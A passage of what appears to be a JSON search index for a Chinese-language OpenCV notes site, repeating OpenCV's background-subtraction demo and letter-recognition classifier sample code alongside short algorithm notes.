? 1 : 30 ; if (c == 'c' || c == 'C' ) { algo_index ++ ; if ( algo_index > 6 ) algo_index = 0 ; bgfs = createBGSubtractorByName(algos[algo_index]); } if (c == 'n' || c == 'N' ) { nthreads ++ ; if ( nthreads > 8 ) nthreads = 1 ; setNumThreads(nthreads); } if (c == 'm' || c == 'M' ) show_fgmask = ! show_fgmask; if (c == 'q' || c == 'Q' || c == 27 ) break ; } return 0 ; } \u7b97\u6cd5 \u00b6 GMG \u00b6 Geometric Multigid Andrew B Godbehere, Akihiro Matsukawa, and Ken Goldberg. Visual tracking of human visitors under variable-lighting conditions for a responsive audio art installation. In American Control Conference (ACC), 2012, pages 4305\u20134312. IEEE, 2012. http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.228.1735&rep=rep1&type=pdf MOG2 \u00b6 MOG2\u7528\u7684\u662f\u81ea\u9002\u5e94\u7684\u9ad8\u65af\u6df7\u5408\u6a21\u578b\uff08Adaptive GMM\uff0cGaussian Mixture Model\uff09 CNT \u00b6 Background subtraction based on counting \u5728\u9ad8\u914d\u8bbe\u5907\u4e2d\u4e8eMOG2\u4e00\u6837\u5feb\uff0c\u5728\u4f4e\u914d\u8bbe\u5907\u4e2d\u7684\u901f\u5ea6\u662fMOG2\u7684\u4e24\u500d\uff08\u6811\u8393\u6d3ePi3\uff09\u3002","title":"bgsegm"},{"location":"module/opencv/opencv-bgsegm/#opencv","text":"Improved Background-Foreground Segmentation Methods https://blog.csdn.net/Anderson_Y/article/details/82082095","title":"opencv \u524d\u666f\u68c0\u6d4b"},{"location":"module/opencv/opencv-bgsegm/#sample","text":"// bgfp vtest.avi #include \"opencv2/bgsegm.hpp\" #include \"opencv2/videoio.hpp\" #include \"opencv2/highgui.hpp\" #include <opencv2/core/utility.hpp> #include <iostream> using namespace cv; using namespace cv :: bgsegm; const String about = \" \\n A program demonstrating the use and capabilities of different background subtraction algorithms \\n \" \"Using OpenCV version \" + String(CV_VERSION) + \" \\n\\n Press 'c' to change the algorithm\" \" \\n Press 'm' to toggle showing only foreground mask or ghost effect\" \" \\n Press 'n' to change number of threads\" \" \\n Press SPACE to toggle wait delay of imshow\" \" \\n Press 'q' or ESC to exit \\n \" ; const String algos[ 7 ] = { \"GMG\" , \"CNT\" , \"KNN\" , \"MOG\" , \"MOG2\" , \"GSOC\" , \"LSBP\" }; static Ptr < BackgroundSubtractor > createBGSubtractorByName( const String & algoName) { Ptr < BackgroundSubtractor > algo; if (algoName == String( \"GMG\" )) algo = createBackgroundSubtractorGMG( 20 , 0.7 ); else if (algoName == String( \"CNT\" )) algo = createBackgroundSubtractorCNT(); else if (algoName == String( \"KNN\" )) algo = createBackgroundSubtractorKNN(); else if (algoName == String( \"MOG\" )) algo = createBackgroundSubtractorMOG(); else if (algoName == String( \"MOG2\" )) algo = createBackgroundSubtractorMOG2(); else if (algoName == String( \"GSOC\" )) algo = createBackgroundSubtractorGSOC(); else if (algoName == String( \"LSBP\" )) algo = createBackgroundSubtractorLSBP(); return algo; } int main( int argc, char ** argv) { CommandLineParser parser(argc, argv, \"{@video | vtest.avi | path to a video file}\" ); parser.about(about); parser.printMessage(); String videoPath = samples :: findFile(parser.get < String > ( 0 ),false); Ptr < BackgroundSubtractor > bgfs = createBGSubtractorByName(algos[ 0 ]); VideoCapture cap; cap.open(videoPath); if ( ! cap.isOpened()) { std :: cerr << \"Cannot read video. Try moving video file to sample directory.\" << std :: endl; return - 1 ; } Mat frame, fgmask, segm; int delay = 0 ; int algo_index = 0 ; int nthreads = getNumberOfCPUs(); bool show_fgmask = false; for (;;) { cap >> frame; if (frame.empty()) { cap.set(CAP_PROP_POS_FRAMES, 0 ); cap >> frame; } bgfs -> apply(frame, fgmask); if (show_fgmask) segm = fgmask; else { frame.convertTo(segm, CV_8U, 0.5 ); add(frame, Scalar( 100 , 100 , 0 ), segm, fgmask); } putText(segm, algos[algo_index], Point( 10 , 30 ), FONT_HERSHEY_PLAIN, 2.0 , Scalar( 255 , 0 , 255 ), 2 , LINE_AA); putText(segm, format( \"%d threads\" , nthreads), Point( 10 , 60 ), FONT_HERSHEY_PLAIN, 2.0 , Scalar( 255 , 0 , 255 ), 2 , LINE_AA); imshow( \"FG Segmentation\" , segm); int c = waitKey(delay); if (c == ' ' ) delay = delay == 30 ? 1 : 30 ; if (c == 'c' || c == 'C' ) { algo_index ++ ; if ( algo_index > 6 ) algo_index = 0 ; bgfs = createBGSubtractorByName(algos[algo_index]); } if (c == 'n' || c == 'N' ) { nthreads ++ ; if ( nthreads > 8 ) nthreads = 1 ; setNumThreads(nthreads); } if (c == 'm' || c == 'M' ) show_fgmask = ! show_fgmask; if (c == 'q' || c == 'Q' || c == 27 ) break ; } return 0 ; }","title":"sample"},{"location":"module/opencv/opencv-bgsegm/#_1","text":"","title":"\u7b97\u6cd5"},{"location":"module/opencv/opencv-bgsegm/#gmg","text":"Geometric Multigid Andrew B Godbehere, Akihiro Matsukawa, and Ken Goldberg. Visual tracking of human visitors under variable-lighting conditions for a responsive audio art installation. In American Control Conference (ACC), 2012, pages 4305\u20134312. IEEE, 2012. http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.228.1735&rep=rep1&type=pdf","title":"GMG"},{"location":"module/opencv/opencv-bgsegm/#mog2","text":"MOG2\u7528\u7684\u662f\u81ea\u9002\u5e94\u7684\u9ad8\u65af\u6df7\u5408\u6a21\u578b\uff08Adaptive GMM\uff0cGaussian Mixture Model\uff09","title":"MOG2"},{"location":"module/opencv/opencv-bgsegm/#cnt","text":"Background subtraction based on counting \u5728\u9ad8\u914d\u8bbe\u5907\u4e2d\u4e8eMOG2\u4e00\u6837\u5feb\uff0c\u5728\u4f4e\u914d\u8bbe\u5907\u4e2d\u7684\u901f\u5ea6\u662fMOG2\u7684\u4e24\u500d\uff08\u6811\u8393\u6d3ePi3\uff09\u3002","title":"CNT"},{"location":"module/opencv/opencv-ml/","text":"opencv ML \u00b6 class \u00b6 class cv :: ml :: ANN_MLP Artificial Neural Networks - Multi - Layer Perceptrons. More... class cv :: ml :: Boost Boosted tree classifier derived from DTrees. More... class cv :: ml :: DTrees The class represents a single decision tree or a collection of decision trees. More... class cv :: ml :: EM The class implements the Expectation Maximization algorithm. More... class cv :: ml :: KNearest The class implements K - Nearest Neighbors model. More... class cv :: ml :: LogisticRegression Implements Logistic Regression classifier. More... class cv :: ml :: NormalBayesClassifier Bayes classifier for normally distributed data. More... // class cv::ml::ParamGrid // The structure represents the logarithmic grid range of statmodel parameters. More... class cv :: ml :: RTrees The class implements the random forest predictor. More... struct cv :: ml :: SimulatedAnnealingSolverSystem This class declares example interface for system state used in simulated annealing optimization algorithm. More... // class cv::ml::StatModel // Base class for statistical models in OpenCV ML. More... class cv :: ml :: SVM Support Vector Machines. More... class cv :: ml :: SVMSGD Stochastic Gradient Descent SVM classifier. More... // class cv::ml::TrainData // Class encapsulating training data. More... \u7b97\u6cd5 \u00b6 MLP \u00b6 MLP(Multilayer PerceptronP) \u591a\u5c42\u611f\u77e5\u673a, \u4e5f\u53eb\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff08ANN\uff0cArtificial Neural Network\uff09\uff0c\u9664\u4e86\u8f93\u5165\u8f93\u51fa\u5c42\uff0c\u5b83\u4e2d\u95f4\u53ef\u4ee5\u6709\u591a\u4e2a\u9690\u5c42\uff0c\u6700\u7b80\u5355\u7684MLP\u53ea\u542b\u4e00\u4e2a\u9690\u5c42\uff0c\u5373\u4e09\u5c42\u7684\u7ed3\u6784 letter recong \u00b6 #include \"opencv2/core.hpp\" #include \"opencv2/ml.hpp\" #include <cstdio> #include <vector> #include <iostream> using namespace std; using namespace cv; using namespace cv :: ml; static void help () { printf( \" \\n The sample demonstrates how to train Random Trees classifier \\n \" \"(or Boosting classifier, or MLP, or Knearest, or Nbayes, or Support Vector Machines - see main()) using the provided dataset. \\n \" \" \\n \" \"We use the sample database letter-recognition.data \\n \" \"from UCI Repository, here is the link: \\n \" \" \\n \" \"Newman, D.J. & Hettich, S. & Blake, C.L. & Merz, C.J. (1998). \\n \" \"UCI Repository of machine learning databases \\n \" \"[http://www.ics.uci.edu/~mlearn/MLRepository.html]. \\n \" \"Irvine, CA: University of California, Department of Information and Computer Science. \\n \" \" \\n \" \"The dataset consists of 20000 feature vectors along with the \\n \" \"responses - capital latin letters A..Z. \\n \" \"The first 16000 (10000 for boosting)) samples are used for training \\n \" \"and the remaining 4000 (10000 for boosting) - to test the classifier. \\n \" \"====================================================== \\n \" ); printf( \" \\n This is letter recognition sample. \\n \" \"The usage: letter_recog [-data=<path to letter-recognition.data>] \\\\\\n \" \" [-save=<output XML file for the classifier>] \\\\\\n \" \" [-load=<XML file with the pre-trained classifier>] \\\\\\n \" \" [-boost|-mlp|-knearest|-nbayes|-svm] # to use boost/mlp/knearest/SVM classifier instead of default Random Trees \\n \" ); } // This function reads data and responses from the file <filename> static bool read_num_class_data ( const string & filename, int var_count, Mat * _data, Mat * _responses ) { const int M = 1024 ; char buf[M + 2 ]; Mat el_ptr( 1 , var_count, CV_32F); int i; vector < int > responses; _data -> release(); _responses -> release(); FILE * f = fopen( filename.c_str(), \"rt\" ); if ( ! f ) { cout << \"Could not read the database \" << filename << endl; return false; } for (;;) { char * ptr; if ( ! fgets( buf, M, f ) || ! strchr( buf, ',' ) ) break ; responses.push_back(( int )buf[ 0 ]); ptr = buf + 2 ; for ( i = 0 ; i < var_count; i ++ ) { int n = 0 ; sscanf( ptr, \"%f%n\" , & el_ptr.at < float > (i), & n ); ptr += n + 1 ; } if ( i < var_count ) break ; _data -> push_back(el_ptr); } fclose(f); Mat(responses).copyTo( * _responses); cout << \"The database \" << filename << \" is loaded. \\n \" ; return true; } template < typename T > static Ptr < T > load_classifier( const string & filename_to_load) { // load classifier from the specified file Ptr < T > model = StatModel :: load < T > ( filename_to_load ); if ( model.empty() ) cout << \"Could not read the classifier \" << filename_to_load << endl; else cout << \"The classifier \" << filename_to_load << \" is loaded. \\n \" ; return model; } static Ptr < TrainData > prepare_train_data( const Mat & data, const Mat & responses, int ntrain_samples) { Mat sample_idx = Mat :: zeros( 1 , data.rows, CV_8U ); Mat train_samples = sample_idx.colRange( 0 , ntrain_samples); train_samples.setTo(Scalar :: all( 1 )); int nvars = data.cols; Mat var_type ( nvars + 1 , 1 , CV_8U ); var_type.setTo(Scalar :: all(VAR_ORDERED)); var_type.at < uchar > (nvars) = VAR_CATEGORICAL; return TrainData :: create(data, ROW_SAMPLE, responses, noArray(), sample_idx, noArray(), var_type); } inline TermCriteria TC( int iters, double eps) { return TermCriteria(TermCriteria :: MAX_ITER + (eps > 0 ? TermCriteria :: EPS : 0 ), iters, eps); } static void test_and_save_classifier( const Ptr < StatModel >& model, const Mat & data, const Mat & responses, int ntrain_samples, int rdelta, const string & filename_to_save) { int i, nsamples_all = data.rows; double train_hr = 0 , test_hr = 0 ; // compute prediction error on train and test data for ( i = 0 ; i < nsamples_all; i ++ ) { Mat sample = data.row(i); float r = model -> predict( sample ); r = std :: abs(r + rdelta - responses.at < int > (i)) <= FLT_EPSILON ? 1.f : 0.f ; if ( i < ntrain_samples ) train_hr += r; else test_hr += r; } test_hr /= nsamples_all - ntrain_samples; train_hr = ntrain_samples > 0 ? train_hr / ntrain_samples : 1. ; printf( \"Recognition rate: train = %.1f%%, test = %.1f%% \\n \" , train_hr * 100. , test_hr * 100. ); if ( ! filename_to_save.empty() ) { model -> save( filename_to_save ); } } static bool build_rtrees_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < RTrees > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load Random Trees classifier if ( ! filename_to_load.empty() ) { model = load_classifier < RTrees > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; // Params( int maxDepth, int minSampleCount, // double regressionAccuracy, bool useSurrogates, // int maxCategories, const Mat& priors, // bool calcVarImportance, int nactiveVars, // TermCriteria termCrit ); Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = RTrees :: create(); model -> setMaxDepth( 10 ); model -> setMinSampleCount( 10 ); model -> setRegressionAccuracy( 0 ); model -> setUseSurrogates(false); model -> setMaxCategories( 15 ); model -> setPriors(Mat()); model -> setCalculateVarImportance(true); model -> setActiveVarCount( 4 ); model -> setTermCriteria(TC( 100 , 0.01f )); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 0 , filename_to_save); cout << \"Number of trees: \" << model -> getRoots().size() << endl; // Print variable importance Mat var_importance = model -> getVarImportance(); if ( ! var_importance.empty() ) { double rt_imp_sum = sum( var_importance )[ 0 ]; printf( \"var# \\t importance (in %%): \\n \" ); int i, n = ( int )var_importance.total(); for ( i = 0 ; i < n; i ++ ) printf( \"%-2d \\t %-4.1f \\n \" , i, 100.f * var_importance.at < float > (i) / rt_imp_sum); } return true; } static bool build_boost_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { const int class_count = 26 ; Mat data; Mat responses; Mat weak_responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; int i, j, k; Ptr < Boost > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.5 ); int var_count = data.cols; // Create or load Boosted Tree classifier if ( ! filename_to_load.empty() ) { model = load_classifier < Boost > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! // // As currently boosted tree classifier in MLL can only be trained // for 2-class problems, we transform the training database by // \"unrolling\" each training sample as many times as the number of // classes (26) that we have. // // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Mat new_data( ntrain_samples * class_count, var_count + 1 , CV_32F ); Mat new_responses ( ntrain_samples * class_count, 1 , CV_32S ); // 1. unroll the database type mask printf( \"Unrolling the database... \\n \" ); for ( i = 0 ; i < ntrain_samples; i ++ ) { const float * data_row = data.ptr < float > (i); for ( j = 0 ; j < class_count; j ++ ) { float * new_data_row = ( float * )new_data.ptr < float > (i * class_count + j); memcpy(new_data_row, data_row, var_count * sizeof (data_row[ 0 ])); new_data_row[var_count] = ( float )j; new_responses.at < int > (i * class_count + j) = responses.at < int > (i) == j + 'A' ; } } Mat var_type( 1 , var_count + 2 , CV_8U ); var_type.setTo(Scalar :: all(VAR_ORDERED)); var_type.at < uchar > (var_count) = var_type.at < uchar > (var_count + 1 ) = VAR_CATEGORICAL; Ptr < TrainData > tdata = TrainData :: create(new_data, ROW_SAMPLE, new_responses, noArray(), noArray(), noArray(), var_type); vector < double > priors( 2 ); priors[ 0 ] = 1 ; priors[ 1 ] = 26 ; cout << \"Training the classifier (may take a few minutes)... \\n \" ; model = Boost :: create(); model -> setBoostType(Boost :: GENTLE); model -> setWeakCount( 100 ); model -> setWeightTrimRate( 0.95 ); model -> setMaxDepth( 5 ); model -> setUseSurrogates(false); model -> setPriors(Mat(priors)); model -> train(tdata); cout << endl; } Mat temp_sample( 1 , var_count + 1 , CV_32F ); float * tptr = temp_sample.ptr < float > (); // compute prediction error on train and test data double train_hr = 0 , test_hr = 0 ; for ( i = 0 ; i < nsamples_all; i ++ ) { int best_class = 0 ; double max_sum = - DBL_MAX; const float * ptr = data.ptr < float > (i); for ( k = 0 ; k < var_count; k ++ ) tptr[k] = ptr[k]; for ( j = 0 ; j < class_count; j ++ ) { tptr[var_count] = ( float )j; float s = model -> predict( temp_sample, noArray(), StatModel :: RAW_OUTPUT ); if ( max_sum < s ) { max_sum = s; best_class = j + 'A' ; } } double r = std :: abs(best_class - responses.at < int > (i)) < FLT_EPSILON ? 1 : 0 ; if ( i < ntrain_samples ) train_hr += r; else test_hr += r; } test_hr /= nsamples_all - ntrain_samples; train_hr = ntrain_samples > 0 ? train_hr / ntrain_samples : 1. ; printf( \"Recognition rate: train = %.1f%%, test = %.1f%% \\n \" , train_hr * 100. , test_hr * 100. ); cout << \"Number of trees: \" << model -> getRoots().size() << endl; // Save classifier to file if needed if ( ! filename_to_save.empty() ) model -> save( filename_to_save ); return true; } static bool build_mlp_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { const int class_count = 26 ; Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < ANN_MLP > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load MLP classifier if ( ! filename_to_load.empty() ) { model = load_classifier < ANN_MLP > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! // // MLP does not support categorical variables by explicitly. // So, instead of the output class label, we will use // a binary vector of <class_count> components for training and, // therefore, MLP will give us a vector of \"probabilities\" at the // prediction stage // // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Mat train_data = data.rowRange( 0 , ntrain_samples); Mat train_responses = Mat :: zeros( ntrain_samples, class_count, CV_32F ); // 1. unroll the responses cout << \"Unrolling the responses... \\n \" ; for ( int i = 0 ; i < ntrain_samples; i ++ ) { int cls_label = responses.at < int > (i) - 'A' ; train_responses.at < float > (i, cls_label) = 1.f ; } // 2. train classifier int layer_sz[] = { data.cols, 100 , 100 , class_count }; int nlayers = ( int )( sizeof (layer_sz) / sizeof (layer_sz[ 0 ])); Mat layer_sizes ( 1 , nlayers, CV_32S, layer_sz ); #if 1 int method = ANN_MLP :: BACKPROP; double method_param = 0.001 ; int max_iter = 300 ; #else int method = ANN_MLP :: RPROP; double method_param = 0.1 ; int max_iter = 1000 ; #endif Ptr < TrainData > tdata = TrainData :: create(train_data, ROW_SAMPLE, train_responses); cout << \"Training the classifier (may take a few minutes)... \\n \" ; model = ANN_MLP :: create(); model -> setLayerSizes(layer_sizes); model -> setActivationFunction(ANN_MLP :: SIGMOID_SYM, 0 , 0 ); model -> setTermCriteria(TC(max_iter, 0 )); model -> setTrainMethod(method, method_param); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 'A' , filename_to_save); return true; } static bool build_knearest_classifier( const string & data_filename, int K ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); Ptr < KNearest > model = KNearest :: create(); model -> setDefaultK(K); model -> setIsClassifier(true); model -> train(tdata); cout << endl; test_and_save_classifier(model, data, responses, ntrain_samples, 0 , string()); return true; } static bool build_nbayes_classifier( const string & data_filename ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < NormalBayesClassifier > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = NormalBayesClassifier :: create(); model -> train(tdata); cout << endl; test_and_save_classifier(model, data, responses, ntrain_samples, 0 , string()); return true; } static bool build_svm_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < SVM > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load Random Trees classifier if ( ! filename_to_load.empty() ) { model = load_classifier < SVM > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = SVM :: create(); model -> setType(SVM :: C_SVC); model -> setKernel(SVM :: LINEAR); model -> setC( 1 ); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 0 , filename_to_save); return true; } int main( int argc, char * argv[] ) { string filename_to_save = \"\" ; string filename_to_load = \"\" ; string data_filename; int method = 0 ; cv :: CommandLineParser parser(argc, argv, \"{data|letter-recognition.data|}{save||}{load||}{boost||}\" \"{mlp||}{knn knearest||}{nbayes||}{svm||}\" ); data_filename = samples :: findFile(parser.get < string > ( \"data\" )); if (parser.has( \"save\" )) filename_to_save = parser.get < string > ( \"save\" ); if (parser.has( \"load\" )) filename_to_load = samples :: findFile(parser.get < string > ( \"load\" )); if (parser.has( \"boost\" )) method = 1 ; else if (parser.has( \"mlp\" )) method = 2 ; else if (parser.has( \"knearest\" )) method = 3 ; else if (parser.has( \"nbayes\" )) method = 4 ; else if (parser.has( \"svm\" )) method = 5 ; help(); if ( (method == 0 ? build_rtrees_classifier( data_filename, filename_to_save, filename_to_load ) : method == 1 ? build_boost_classifier( data_filename, filename_to_save, filename_to_load ) : method == 2 ? build_mlp_classifier( data_filename, filename_to_save, filename_to_load ) : method == 3 ? build_knearest_classifier( data_filename, 10 ) : method == 4 ? build_nbayes_classifier( data_filename) : method == 5 ? build_svm_classifier( data_filename, filename_to_save, filename_to_load ) : - 1 ) < 0 ) return 0 ; }","title":"ml"},{"location":"module/opencv/opencv-ml/#opencv-ml","text":"","title":"opencv ML"},{"location":"module/opencv/opencv-ml/#class","text":"class cv :: ml :: ANN_MLP Artificial Neural Networks - Multi - Layer Perceptrons. More... class cv :: ml :: Boost Boosted tree classifier derived from DTrees. More... class cv :: ml :: DTrees The class represents a single decision tree or a collection of decision trees. More... class cv :: ml :: EM The class implements the Expectation Maximization algorithm. More... class cv :: ml :: KNearest The class implements K - Nearest Neighbors model. More... class cv :: ml :: LogisticRegression Implements Logistic Regression classifier. More... class cv :: ml :: NormalBayesClassifier Bayes classifier for normally distributed data. More... // class cv::ml::ParamGrid // The structure represents the logarithmic grid range of statmodel parameters. More... class cv :: ml :: RTrees The class implements the random forest predictor. More... struct cv :: ml :: SimulatedAnnealingSolverSystem This class declares example interface for system state used in simulated annealing optimization algorithm. More... // class cv::ml::StatModel // Base class for statistical models in OpenCV ML. More... class cv :: ml :: SVM Support Vector Machines. More... class cv :: ml :: SVMSGD Stochastic Gradient Descent SVM classifier. More... // class cv::ml::TrainData // Class encapsulating training data. More...","title":"class"},{"location":"module/opencv/opencv-ml/#_1","text":"","title":"\u7b97\u6cd5"},{"location":"module/opencv/opencv-ml/#mlp","text":"MLP(Multilayer PerceptronP) \u591a\u5c42\u611f\u77e5\u673a, \u4e5f\u53eb\u4eba\u5de5\u795e\u7ecf\u7f51\u7edc\uff08ANN\uff0cArtificial Neural Network\uff09\uff0c\u9664\u4e86\u8f93\u5165\u8f93\u51fa\u5c42\uff0c\u5b83\u4e2d\u95f4\u53ef\u4ee5\u6709\u591a\u4e2a\u9690\u5c42\uff0c\u6700\u7b80\u5355\u7684MLP\u53ea\u542b\u4e00\u4e2a\u9690\u5c42\uff0c\u5373\u4e09\u5c42\u7684\u7ed3\u6784","title":"MLP"},{"location":"module/opencv/opencv-ml/#letter-recong","text":"#include \"opencv2/core.hpp\" #include \"opencv2/ml.hpp\" #include <cstdio> #include <vector> #include <iostream> using namespace std; using namespace cv; using namespace cv :: ml; static void help () { printf( \" \\n The sample demonstrates how to train Random Trees classifier \\n \" \"(or Boosting classifier, or MLP, or Knearest, or Nbayes, or Support Vector Machines - see main()) using the provided dataset. \\n \" \" \\n \" \"We use the sample database letter-recognition.data \\n \" \"from UCI Repository, here is the link: \\n \" \" \\n \" \"Newman, D.J. & Hettich, S. & Blake, C.L. & Merz, C.J. (1998). \\n \" \"UCI Repository of machine learning databases \\n \" \"[http://www.ics.uci.edu/~mlearn/MLRepository.html]. \\n \" \"Irvine, CA: University of California, Department of Information and Computer Science. \\n \" \" \\n \" \"The dataset consists of 20000 feature vectors along with the \\n \" \"responses - capital latin letters A..Z. \\n \" \"The first 16000 (10000 for boosting)) samples are used for training \\n \" \"and the remaining 4000 (10000 for boosting) - to test the classifier. \\n \" \"====================================================== \\n \" ); printf( \" \\n This is letter recognition sample. \\n \" \"The usage: letter_recog [-data=<path to letter-recognition.data>] \\\\\\n \" \" [-save=<output XML file for the classifier>] \\\\\\n \" \" [-load=<XML file with the pre-trained classifier>] \\\\\\n \" \" [-boost|-mlp|-knearest|-nbayes|-svm] # to use boost/mlp/knearest/SVM classifier instead of default Random Trees \\n \" ); } // This function reads data and responses from the file <filename> static bool read_num_class_data ( const string & filename, int var_count, Mat * _data, Mat * _responses ) { const int M = 1024 ; char buf[M + 2 ]; Mat el_ptr( 1 , var_count, CV_32F); int i; vector < int > responses; _data -> release(); _responses -> release(); FILE * f = fopen( filename.c_str(), \"rt\" ); if ( ! f ) { cout << \"Could not read the database \" << filename << endl; return false; } for (;;) { char * ptr; if ( ! fgets( buf, M, f ) || ! strchr( buf, ',' ) ) break ; responses.push_back(( int )buf[ 0 ]); ptr = buf + 2 ; for ( i = 0 ; i < var_count; i ++ ) { int n = 0 ; sscanf( ptr, \"%f%n\" , & el_ptr.at < float > (i), & n ); ptr += n + 1 ; } if ( i < var_count ) break ; _data -> push_back(el_ptr); } fclose(f); Mat(responses).copyTo( * _responses); cout << \"The database \" << filename << \" is loaded. \\n \" ; return true; } template < typename T > static Ptr < T > load_classifier( const string & filename_to_load) { // load classifier from the specified file Ptr < T > model = StatModel :: load < T > ( filename_to_load ); if ( model.empty() ) cout << \"Could not read the classifier \" << filename_to_load << endl; else cout << \"The classifier \" << filename_to_load << \" is loaded. \\n \" ; return model; } static Ptr < TrainData > prepare_train_data( const Mat & data, const Mat & responses, int ntrain_samples) { Mat sample_idx = Mat :: zeros( 1 , data.rows, CV_8U ); Mat train_samples = sample_idx.colRange( 0 , ntrain_samples); train_samples.setTo(Scalar :: all( 1 )); int nvars = data.cols; Mat var_type ( nvars + 1 , 1 , CV_8U ); var_type.setTo(Scalar :: all(VAR_ORDERED)); var_type.at < uchar > (nvars) = VAR_CATEGORICAL; return TrainData :: create(data, ROW_SAMPLE, responses, noArray(), sample_idx, noArray(), var_type); } inline TermCriteria TC( int iters, double eps) { return TermCriteria(TermCriteria :: MAX_ITER + (eps > 0 ? TermCriteria :: EPS : 0 ), iters, eps); } static void test_and_save_classifier( const Ptr < StatModel >& model, const Mat & data, const Mat & responses, int ntrain_samples, int rdelta, const string & filename_to_save) { int i, nsamples_all = data.rows; double train_hr = 0 , test_hr = 0 ; // compute prediction error on train and test data for ( i = 0 ; i < nsamples_all; i ++ ) { Mat sample = data.row(i); float r = model -> predict( sample ); r = std :: abs(r + rdelta - responses.at < int > (i)) <= FLT_EPSILON ? 1.f : 0.f ; if ( i < ntrain_samples ) train_hr += r; else test_hr += r; } test_hr /= nsamples_all - ntrain_samples; train_hr = ntrain_samples > 0 ? train_hr / ntrain_samples : 1. ; printf( \"Recognition rate: train = %.1f%%, test = %.1f%% \\n \" , train_hr * 100. , test_hr * 100. ); if ( ! filename_to_save.empty() ) { model -> save( filename_to_save ); } } static bool build_rtrees_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < RTrees > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load Random Trees classifier if ( ! filename_to_load.empty() ) { model = load_classifier < RTrees > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; // Params( int maxDepth, int minSampleCount, // double regressionAccuracy, bool useSurrogates, // int maxCategories, const Mat& priors, // bool calcVarImportance, int nactiveVars, // TermCriteria termCrit ); Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = RTrees :: create(); model -> setMaxDepth( 10 ); model -> setMinSampleCount( 10 ); model -> setRegressionAccuracy( 0 ); model -> setUseSurrogates(false); model -> setMaxCategories( 15 ); model -> setPriors(Mat()); model -> setCalculateVarImportance(true); model -> setActiveVarCount( 4 ); model -> setTermCriteria(TC( 100 , 0.01f )); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 0 , filename_to_save); cout << \"Number of trees: \" << model -> getRoots().size() << endl; // Print variable importance Mat var_importance = model -> getVarImportance(); if ( ! var_importance.empty() ) { double rt_imp_sum = sum( var_importance )[ 0 ]; printf( \"var# \\t importance (in %%): \\n \" ); int i, n = ( int )var_importance.total(); for ( i = 0 ; i < n; i ++ ) printf( \"%-2d \\t %-4.1f \\n \" , i, 100.f * var_importance.at < float > (i) / rt_imp_sum); } return true; } static bool build_boost_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { const int class_count = 26 ; Mat data; Mat responses; Mat weak_responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; int i, j, k; Ptr < Boost > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.5 ); int var_count = data.cols; // Create or load Boosted Tree classifier if ( ! filename_to_load.empty() ) { model = load_classifier < Boost > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! // // As 